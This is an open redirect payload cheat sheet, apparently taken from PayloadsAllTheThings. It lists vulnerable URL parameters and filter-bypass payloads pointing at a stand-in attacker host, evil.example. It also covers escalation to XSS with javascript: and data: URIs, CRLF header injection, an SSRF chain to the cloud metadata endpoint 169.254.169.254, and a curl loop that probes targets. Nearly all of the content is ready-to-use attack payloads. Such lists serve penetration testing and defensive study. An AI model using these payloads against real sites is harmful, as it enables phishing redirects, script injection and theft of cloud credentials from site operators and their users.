# Open Redirect Payloads

> Source: PayloadsAllTheThings — Open Redirect

## Common Vulnerable Parameters

```
?redirect=
?url=
?next=
?return=
?goto=
?dest=
?destination=
?redir=
?redirect_url=
?return_to=
?checkout_url=
?continue=
?forward=
?target=
```

## URL Parsing Confusion

```
# @ character — browser treats left side as credentials
http://target.example@evil.example/
http://www.target.example@evil.example/

# Query string ambiguity
http://evil.example?http://target.example/
http://target.example?redirect=http://evil.example/

# Path confusion
http://target.example/http://evil.example/
http://target.example/redirect/http://evil.example/

# Folder masquerading
http://evil.example/folder/www.target.example

# Backslash confusion
http://evil.example\@target.example
```

## Protocol-Relative URLs

```
//evil.example
////evil.example
\/\/evil.example/
/\/evil.example/
//evil.example/%2f..
```

### Protocol Tricks

```
https:evil.example          (bypasses // blacklist)
javascript:alert(1)     (XSS escalation)
data:text/html,<script>alert(1)</script>
```

## Unicode Normalization

```
# Unicode character substitution
https://evil.c%E2%84%80.target.example    (U+2100)
http://evil.example%E3%80%82target.example     (U+3002 ideographic period)
http://a.com%EF%BC%8Fx.b.com          (fullwidth slash)

# Homograph attack
https://evil.xn--target-com.com        (punycode)
```

## Null Byte and Special Characters

```
//evil%00.target.example
//evil.example%0d%0a
//evil.example%23.target.example    (# fragment)
//evil.example%3F.target.example    (? query)
```

## Parameter Pollution

```
# Duplicate parameter — second value may win
?next=target.example&next=evil.example

# Array syntax
?next[]=target.example&next[]=evil.example
```

## Whitelist/Domain Bypass

```
# Subdomain matching bypass
https://target.example.evil.example
https://target.example-evil.example
https://evil-target.example

# Adding allowed domain as subdirectory
https://evil.example/target.example

# Combining techniques
https://target.example@evil.example
//target.example%40evil.example
```

## CRLF + Open Redirect

```
/%0d%0aLocation:%20http://evil.example
/redirect?url=%0d%0aLocation:%20http://evil.example
```

## Open Redirect to XSS

```
javascript:alert(document.domain)//
java%0d%0ascript%0d%0a:alert(0)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Open Redirect to SSRF

```
# If the server follows redirects server-side
?url=http://evil.example/redirect?to=http://169.254.169.254/latest/meta-data/
```

## Testing Automation

```bash
# Test common parameters with redirect payload
PARAMS="redirect url next return goto dest redir redirect_url return_to"
TARGET="http://target.example"

for p in $PARAMS; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?$p=https://evil.example")
  LOCATION=$(curl -s -I "$TARGET/?$p=https://evil.example" | grep -i "location:")
  echo "$p -> $CODE $LOCATION"
done
```
